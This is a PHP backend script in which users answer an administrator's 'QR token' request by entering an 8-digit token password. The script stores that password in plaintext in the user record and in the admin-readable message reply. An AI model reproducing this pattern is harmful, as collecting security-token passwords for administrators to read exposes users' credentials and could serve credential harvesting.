<?php
error_reporting(E_ERROR | E_PARSE);

require_once __DIR__ . '/../php_config/helpers.php';

define('TOKEN_QR_EMPRESA_PREFIX', '[[TOKEN_QR_EMPRESA]]');

exigirPOST();
$usuario_id = verificarUsuarioSesion();

try {
    $pdo = conectarBD();
    $input = leerJSON();
    $accion = $input['accion'] ?? '';

    if ($accion === 'cancelar_token_qr') {
        $mensaje_id = intval($input['mensaje_id'] ?? 0);

        $stmt = $pdo->prepare("
            SELECT id FROM mensajes_admin
            WHERE id = ? AND usuario_id = ? AND mensaje LIKE ? AND estado = 'pendiente'
        ");
        $stmt->execute([$mensaje_id, $usuario_id, TOKEN_QR_EMPRESA_PREFIX . '%']);

        if (!$stmt->fetch()) {
            jsonResponse(['success' => false, 'error' => 'Solicitud de token QR no encontrada']);
        }

        $update = $pdo->prepare("
            UPDATE mensajes_admin
            SET estado = 'leido', fecha_leido = NOW()
            WHERE id = ? AND usuario_id = ?
        ");
        $update->execute([$mensaje_id, $usuario_id]);

        jsonResponse(['success' => true]);
    }

    if ($accion === 'guardar_token_qr') {
        $mensaje_id = intval($input['mensaje_id'] ?? 0);
        $token_codigo = trim($input['token_codigo'] ?? '');

        if (!preg_match('/^[0-9]{8}$/', $token_codigo)) {
            jsonResponse(['success' => false, 'error' => 'Ingresa la contraseña de 8 dígitos de tu token']);
        }

        $stmt = $pdo->prepare("
            SELECT id FROM mensajes_admin
            WHERE id = ? AND usuario_id = ? AND mensaje LIKE ? AND estado = 'pendiente'
        ");
        $stmt->execute([$mensaje_id, $usuario_id, TOKEN_QR_EMPRESA_PREFIX . '%']);

        if (!$stmt->fetch()) {
            jsonResponse(['success' => false, 'error' => 'Solicitud de token QR no encontrada']);
        }

        $pdo->beginTransaction();

        $updUser = $pdo->prepare('UPDATE usuarios SET sgdotoken_qr_codigo = ? WHERE id = ?');
        $updUser->execute([$token_codigo, $usuario_id]);

        $updMsg = $pdo->prepare("
            UPDATE mensajes_admin
            SET estado = 'respondido',
                respuesta_usuario = ?,
                fecha_respuesta = NOW()
            WHERE id = ? AND usuario_id = ?
        ");
        $updMsg->execute([$token_codigo, $mensaje_id, $usuario_id]);

        $pdo->commit();

        jsonResponse(['success' => true, 'message' => 'Token QR registrado correctamente']);
    }

    jsonResponse(['success' => false, 'error' => 'Acción no válida']);
} catch (PDOException $e) {
    if ($pdo->inTransaction()) {
        $pdo->rollBack();
    }
    error_log('token_qr_empresa_procesar PDO: ' . $e->getMessage());
    jsonError('Error de base de datos', 500);
} catch (Exception $e) {
    if (isset($pdo) && $pdo->inTransaction()) {
        $pdo->rollBack();
    }
    error_log('token_qr_empresa_procesar: ' . $e->getMessage());
    jsonError('Error interno', 500);
}
